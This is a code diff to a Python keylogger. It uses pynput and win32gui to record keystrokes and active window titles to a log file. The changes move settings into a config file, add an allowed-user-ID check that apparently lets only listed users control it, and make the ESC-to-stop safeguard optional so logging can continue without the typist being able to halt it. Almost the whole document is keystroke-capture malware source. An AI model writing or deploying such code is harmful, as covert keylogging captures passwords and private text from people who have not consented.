@@ -1,14 +1,22 @@
 from pynput import keyboard
 import win32gui
 import time
+from config import KEYLOGGER_INACTIVE_DURATION, KEYLOGGER_ESC_KEY_STOPS, ALLOWED_USER_IDS
 
 # Specify the log file, will be dynamically set by filename when logging
 log_file = None
 
 # Initialize variables
 last_key_time = time.time()  # Track the last time a key was pressed
-inactive_duration = 3  # 3 seconds of inactivity
+inactive_duration = KEYLOGGER_INACTIVE_DURATION  # 3 seconds of inactivity
 current_window = None  # Store the current window title
+
+# Function to check if user is allowed
+def is_user_allowed(user_id: int) -> bool:
+    # If no allowed user IDs are specified, allow all users
+    if not ALLOWED_USER_IDS:
+        return True
+    return user_id in ALLOWED_USER_IDS
 
 # Function to log key presses
 def on_press(key):
@@ -73,7 +81,7 @@ def get_active_window():
 
 # Function to handle key release
 def on_release(key):
-    if key == keyboard.Key.esc:  # Press ESC to stop the keylogger
+    if KEYLOGGER_ESC_KEY_STOPS and key == keyboard.Key.esc:  # Press ESC to stop the keylogger
         return False
 
 # Start the keylogger and log for a specified duration (in minutes)
